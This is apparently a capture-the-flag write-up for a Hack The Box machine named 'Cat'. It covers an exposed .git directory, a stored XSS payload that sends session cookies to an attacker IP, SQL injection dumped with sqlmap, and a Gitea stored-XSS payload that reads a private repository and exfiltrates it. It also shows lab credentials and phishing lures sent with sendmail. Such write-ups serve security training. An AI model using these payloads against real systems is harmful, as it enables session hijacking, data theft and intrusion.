---
title: Cat
date: 2025-03-06
description: Medium-difficulty Linux machine involving source code disclosure through an exposed `.git` directory, stored XSS for session hijacking, SQL injection against a SQLite backend, credential recovery through log analysis, and privilege escalation via a vulnerable internal Gitea instance leading to root access.
tags:
  - htb
  - Medium
  - Linux
---

# Initial Recon

`nmap` revealed SSH and HTTP services exposed on the target.

```bash
nmap -p22,80 -A -oN scan_results.txt 10.10.11.53
```

The web application hosted on port `80` exposed a publicly accessible `.git` directory. Dumping the repository with `git-dumper` provided access to the application source code.

## Source Code Review

Reviewing the PHP files uncovered multiple attack surfaces:

- `join.php`
- `view_cat.php`
- `accept_cat.php`

The code suggested potential **Stored XSS** and **SQL Injection** vectors.

# User

### Stored XSS

The username field in `join.php` lacked proper sanitization. A malicious account was created using the following payload:

```js
document.location='http://10.10.14.81:8000/y?='+document.cookie;
```

Once logged in, the contest feature allowed cat submissions. Although the submission form itself was heavily filtered, the injected username was later rendered inside the admin review workflow, triggering the payload when viewed by an administrator.

A listener was configured to capture incoming requests. After the administrator reviewed the submission, the session cookie was leaked successfully.

The stolen session granted access to the administrative panel, although the session expired quickly and required rapid interaction.

## SQL Injection

Accepting a cat submission generated a request to `accept_cat.php`.

```http
POST /accept_cat.php HTTP/1.1

catName=test'); select * from users;--&catId=2
```

The successful response indicated a blind SQL injection vector.

```bash
sqlmap -r request.txt -p catName --dbms=sqlite --level=5 --risk=3 --tables --dump --threads=10
```

Database contents were extracted and password hashes recovered. One hash was cracked through CrackStation.

```text
rosa : soyunaprincesarosa
```

## SSH Access

```bash
ssh rosa@cat.htb
```

## Lateral Movement

The `rosa` account belonged to the `adm` group, allowing access to files under `/var/log`.

Reviewing `access.log.1` exposed credentials used internally.

```text
axel : aNdZwgC4tI9gnVXv_e3Q
```

Switching to `axel` provided access to the user flag.

```bash
su axel
```

# Root

## Internal Gitea Enumeration

Mail stored in `/var/mail/axel` referenced an internal Gitea instance running on port `3000`.

```bash
ssh -L 3000:127.0.0.1:3000 axel@cat.htb
```

The service was running:

```text
Gitea 1.22.0
```

Research identified **CVE-2024-6886**, a Stored XSS vulnerability affecting repository descriptions.

```html
<a href=javascript:alert()>XSS test</a>
```

## Exploiting Gitea

Additional mail referenced a private repository:

```text
http://localhost:3000/administrator/Employee-management/
```

Using `sendmail`, links could be delivered directly to `jobert`.

```bash
echo "http://10.10.14.81/test" | sendmail jobert@cat.htb
```

A hosted listener confirmed interaction with the supplied URLs.

A malicious repository description was created to read internal resources and exfiltrate their contents.

```javascript
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.81:8000/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```

A notification email was sent to lure `jobert` into viewing the repository.

```bash
echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/lynx" | sendmail jobert@cat.htb
```

The payload successfully retrieved data from the private repository. Further targeting of application files eventually exposed administrative credentials.

The recovered credentials allowed a switch to the root account.

```bash
su root
```

Gained root
